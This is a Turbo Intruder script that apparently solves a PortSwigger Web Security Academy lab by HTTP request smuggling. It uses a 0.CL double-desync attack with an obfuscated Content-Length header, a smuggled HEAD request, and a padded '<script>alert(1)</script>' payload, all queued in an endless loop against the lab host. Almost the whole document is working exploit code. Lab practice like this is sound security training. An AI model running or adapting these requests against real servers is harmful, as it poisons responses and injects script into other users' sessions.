# Refer to https://portswigger.net/research/http1-must-die
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    host = '0ac300a60402c073805d03f0008400a2.web-security-academy.net'

    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    attack1 = '''GET /resources/labheader/js/labHeader.js HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length : 76

'''

    # This will get prefixed to the victim's request - place your payload in here
    attack2 = '''GET /resources/labheader/js/labHeader.js HTTP/1.1
Content-Length: 1234
X: GET /resources/css/labsBlog.css HTTP/1.1
Host: '''+host+'''
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive

HEAD /post/comment/confirmation?postId=6 HTTP/1.1
Host: '''+host+'''
Connection: keep-alive

GET /resources?hh=<script>alert(1)</script>'''+('A'*6500)+''' HTTP/1.1
X: y'''

    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close

'''

    while True:
        for x in range(7):
            engine.queue(attack1, label="attack1")
            engine.queue(attack2, label="attack2")
#            engine.queue(victim, label="victim")
        


def handleResponse(req, interesting):
    table.add(req)

    # 0.CL attacks use a double desync so they can take a while!
    # Uncomment & customise this if you want the attack to automatically stop on success
    if req.label == 'victim' and (req.status == 404 or 'alert' in req.response):
        req.lable = 'victim success'
        req.engine.cancel()

